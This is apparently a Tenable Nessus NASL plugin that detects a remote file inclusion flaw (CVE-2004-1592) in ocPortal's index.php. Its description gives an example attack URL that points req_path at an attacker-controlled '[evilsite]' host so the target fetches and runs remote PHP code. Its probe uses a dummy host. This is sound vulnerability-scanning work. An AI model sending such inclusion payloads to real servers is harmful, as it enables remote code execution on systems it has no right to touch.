#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
 script_id(15468);
 script_version ("$Revision: 1.11 $");
 script_cve_id("CVE-2004-1592");
 script_bugtraq_id(11368);
 script_osvdb_id(10712);

 script_name(english:"ocPortal index.php req_path Parameter Remote File Inclusion");
 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by a 
remote file inclusion vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running ocPortal, a content management 
system written in PHP.

There is a bug in the remote version of this software which
may allow an attacker to execute arbitrary commands on the 
remote host by using a file inclusion bug in the file 
'index.php'.

An attacker may execute arbitrary commands by requesting :

	http://www.example.com/index.php?req_path=http://[evilsite]/

which will make the remote script include the file 'funcs.php' on the remote
site and execute it." );
 script_set_attribute(attribute:"solution", value:
"Upgrade the newest version of this software" );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2004/10/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/10/13");
 script_cvs_date("$Date: 2011/03/14 21:48:08 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Determines if ocPortal can include third-party files");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2004-2011 Tenable Network Security, Inc.");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port))exit(0,"The remote web server does not support PHP");

foreach d (cgi_dirs())
{
 url = string(d, "/index.php?req_path=http://xxxxxx./");
 res = http_send_recv3(method:"GET", item:url, port:port);
 if( isnull(res)) exit(0);
 if ( "http://xxxxxx./funcs.php" >< res[2] )
 {
  security_hole(port);
  exit(0);
 }
}
